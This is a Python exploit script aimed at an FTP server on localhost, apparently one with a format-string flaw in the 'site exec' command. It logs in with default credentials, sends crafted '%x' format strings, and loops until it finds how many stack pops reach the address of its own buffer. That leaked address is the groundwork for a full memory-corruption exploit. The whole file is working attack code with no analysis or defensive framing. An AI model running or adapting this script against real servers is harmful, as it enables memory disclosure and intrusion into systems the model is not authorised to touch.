#!/usr/bin/env python3

import socket
import struct

POPS = 21
PAD_BYTES = 2

def banner(s):
    print(s.recv(1024))


def login(s):
    s.send(b'user user\n')
    print(s.recv(1024))
    s.send(b'pass password\n')
    print(s.recv(1024))


def craft_exploit_string(pops, pad_bytes):
    exploit_str = pad_bytes * b'a'
    exploit_str += b'bbbb'
    exploit_str += b'%x' * pops
    exploit_str += b'_' * 14 + b'%%'
    exploit_str += b'%s'
    return exploit_str


def site_exec(s, msg):
    s.send(b'site exec ' + msg + b'\n')
    response = s.recv(2048)
    if response.startswith(b'200') and not b'end of' in response:
        response += s.recv(2048)
    return response


def read_value_at_pops(s, pops):
    exploit_str = b'%x' * pops + b'val:%8x'
    response = site_exec(s, exploit_str)
    print(response)
    if response:
        response = response.split(b'\r\n')[0]
        if b'val:' in response:
            response = response.split(b'val:')[1]
            return response
    return None


def main():
    pops_to_buf_addr = 0
    while True:
        print(f'[*] (Re)connecting..')
        with socket.socket() as s:
            s.connect(('localhost', 21))
            banner(s)
            login(s)

            # Keep reusing this session if it didn't break
            while True:
                print(f'\n[*] Trying with {pops_to_buf_addr} pops')
                exploit_str = craft_exploit_string(pops_to_buf_addr, PAD_BYTES)
                print(f'[*] Exploit crafted:')
                print(exploit_str)
                response = site_exec(s, exploit_str)
                print(response)
                pops_to_buf_addr += 1

                if not response:
                    break # break out of this socket session and force reconnect

                response = response.split(b'\r\n')[0]
                if response.count(b'_') <= 14:
                    continue

                # Found
                print(f'[+] Found. Pops required to reach a location containing the address of the buffer: {pops_to_buf_addr - 1}')
                buf_addr = read_value_at_pops(s, pops_to_buf_addr - 1)
                print(f'[+] Value after {pops_to_buf_addr - 1} pops: {buf_addr}')
                if not buf_addr or not buf_addr.startswith(b'ff'):
                    print(f'[-] Buffer is in heap, continuing')
                    continue
                print('[+] Success. Address of buffer in stack found.')
                exit(0)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print()

